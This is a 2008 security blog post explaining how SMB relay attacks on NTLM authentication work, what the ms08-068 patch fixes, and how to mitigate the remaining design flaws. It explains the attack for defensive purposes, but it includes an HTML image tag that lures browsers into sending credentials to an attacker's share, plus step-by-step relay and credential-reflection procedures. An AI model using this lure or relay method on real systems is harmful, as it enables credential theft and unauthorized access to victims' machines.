---
id: 121
title: 'ms08-068 &#8212; Preventing SMBRelay Attacks'
date: '2008-11-12T12:30:48-05:00'
author: 'Ron Bowes'
layout: revision
guid: 'http://www.skullsecurity.org/blog/?p=121'
permalink: '/?p=121'
---

Microsoft released ms08-068 this week, which fixes a vulnerability that's been present and documented since 2001. I'm going to write a quick overview of it here, although you'll probably get a better one by reading [The Metasploit Blog](http://blog.metasploit.com/2008/11/ms08-067-metasploit-and-smb-relay.html).

Keep in mind that there is a lot of fun stuff that can be done with the SMB protocol. I'm going to talk about a few different design flaws right now, and point out exactly what ms08-068 patches. Hang on, though, this is going to get somewhat technical. The payoff, however, is that this is incredibly interesting stuff, and I'm happy to clear up any technical confusion. Just leave me a comment or an email!

I have talked about how [Lanman and NTLM](http://www.skullsecurity.org/blog/?p=34) work (or fail to work) in the past, so I'll assume you've read that and just post a quick overview here. Basically, Lanman and NTLM will hash your password using their respective algorithms (and store the hashes on the system), then hash it again based on the server's 8-byte challenge. This second hash is the same for Lanman and NTLM -- it takes the hash already generated, splits it into three 7-byte chunks (padding it to 21 bytes), and encrypting the server challenge with each of those chunks. If an attacker already has access to the Lanman and NTLM hashes, then the game has already been won (the hashes can be directly used to log in).

The primary advantage to having a server challenge is to prevent pre-computed attacks (that is, it provides salt-like value to prevent rainbow tables-style precomputation attacks against the algorithm). Naturally, a malicious server can send a known challenge and generate tables based on that. This type of attack has been fixed in NTLMv2 (since the client provides part of the randomness).

A SMB Relay attack is a type of man-in-the-middle attack where the attacker asks the victim to authenticate to a machine controlled by the attacker, then relays the credentials to the target. The attacker forwards the authentication information both ways, giving him access. Here are the players in this scenario:

- The **attacker** is the person trying to break into the target
- The **victim** is the person who has the credentials
- The **target** is the system the attacker wants access to, and that the victim has credentials for

And here's the scenario (see the image at the right for a diagram):  
![](http://www.skullsecurity.org/blogdata/ms08-068-1.png)

1. Attacker tricks the victim into connecting to him; this is easy, I'll explain how later
2. Attacker establishes connection to the target, receives the 8-byte challenge
3. Attacker sends the 8-byte challenge to victim
4. Victim responds to the attacker with the password hash
5. Attacker responds to the target's challenge with the victim's hash
6. Target grants access to attacker

In the case of Metasploit, the attacker goes on to upload and execute shellcode, but that process isn't important, and it's discussed on the Metasploit blog posting.

Now, as an attacker, we have two problems: the victim needs to initiate a connection to the attacker, and the victim needs to have access to the target.

The first problem is easy to solve -- to initiate a session, send the user a link that goes to the attacker's machine. For example, send them to a Web site containing the following code:

```
<img src="\AttackerSHAREfile.jpg">
```

Their browser will attempt to connect to a share on the attacker called "SHARE", during which a session will be established. The victim's machine will automatically send the current credentials, hashed with whatever challenge is sent by the attacker (naturally, it's the target's challenge). This can be delivered to them through an email link, through a stored cross-site scripting attack, by some sneaky vandalism, or by any number of ways.

Other ways to do this include DNS poisoning, ARP spoofing, \[url=http://www.skullsecurity.org/blog/?p=6\]NetBIOS poisoning\[/url\], and any number of other ways. Suffice to say, it's pretty easy to trick the victim.

The second trick is that the victim needs to have access to the target. This one is slightly more difficult, but it can happen in a number of ways:

- In a domain scenario, the user's domain account may have access to multiple machines, including the target
- In other scenarios, users are well known to synchronize their password between machines. The target may have the same password as the victim, which would make the attack work
- The target may be the *same physical machine as the victim*

That third point is the interesting one -- this can be used to exploit the computer itself! So, in that scenario, here are the modified steps (see the image at the right, although I think it's probably more confusing :) ):  
![](http://www.skullsecurity.org/blogdata/ms08-068-2.png)

1. Attacker tricks the victim into connecting to him
2. Attacker establishes connection back to the victim, receives the 8-byte challenge
3. Attacker sends the victim's 8-byte back
4. Victim responds to the attacker with the password hash that'll give the attacker access to the victim's own computer
5. Attacker responds to the victim's challenge with the victim's hash
6. Victim grants access to attacker

Hopefully that isn't too confusing. What it essentially means is that the victim will grant access to the attacker using its own credentials.

And this particular attack is what ms08-068 patches!

To put it another way: ms08-068 patches an attack (discovered in 2001) where a victim is tricked into giving an attacker access to connect to itself.

## Mitigation

I talked a lot about vulnerabilities in the SMB protocol. Unfortunately, ms08-068 only fixes one of them. The issue is that the others are design flaws and can't be fixed without breaking clients. That being said, even though Microsoft can't fix them, you can fix them yourself, more or less, at the cost of potentially breaking clients (these can be done with local/domain security policies or registry hacks; search for them to find information):

- Enable (and require) NTLMv2 authentication -- this will prevent pre-computed attacks, because the client provides part of the randomness
- Enable (and require) message signing for both clients and servers -- this will prevent relay attacks
- Install ms08-068 -- this will prevent a specific subset of relay attacks, where its relayed back to itself

Hope that helps!

And, as usual, if you have any questions feel free to track me down.

Ron